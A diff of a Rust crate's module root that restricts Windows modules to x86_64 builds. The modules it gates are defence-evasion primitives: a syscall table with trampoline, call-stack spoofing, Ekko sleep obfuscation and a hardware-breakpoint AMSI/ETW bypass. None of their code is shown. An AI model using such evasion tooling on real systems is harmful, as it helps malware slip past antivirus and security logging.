@@ -7,41 +7,46 @@
 
 pub mod types;
 
-#[cfg(windows)]
+// The syscall primitives below (SSN table + trampoline, stub/spoof assembly,
+// ekko sleep obfuscation, hardware breakpoint ETW/AMSI bypass) are x86_64-only:
+// the register contexts, ROP frames and inline assembly target the AMD64 ABI.
+// On other architectures (incl. aarch64 Windows) the crate degrades to a
+// no-op so the kernel still builds — callers fall back to standard APIs.
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod extract;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod ffi;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod hwbp;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod invoke;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod pe;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod sleepobf;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod spoof;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod stub;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 mod table;
 
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub use extract::{probe_stub, StubProbe};
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub use hwbp::install_amsi_etw_bypass;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub use invoke::*;
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub use sleepobf::{obfuscated_sleep, Context};
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub use spoof::{init_spoof, spoof_call, SpoofFrame};
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub use table::SyscallTable;
 pub use types::*;
 
 ///
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 pub fn init() -> Result<(), &'static str> {
     let table = SyscallTable::build()?;
     if table.trampoline == 0 {
@@ -56,7 +61,9 @@ pub fn init() -> Result<(), &'static str> {
     Ok(())
 }
 
-#[cfg(not(windows))]
+/// No-op when the x86_64 syscall primitives are unavailable (non-Windows or
+/// non-x86_64 Windows).
+#[cfg(not(all(windows, target_arch = "x86_64")))]
 pub fn init() -> Result<(), &'static str> {
     Ok(())
 }
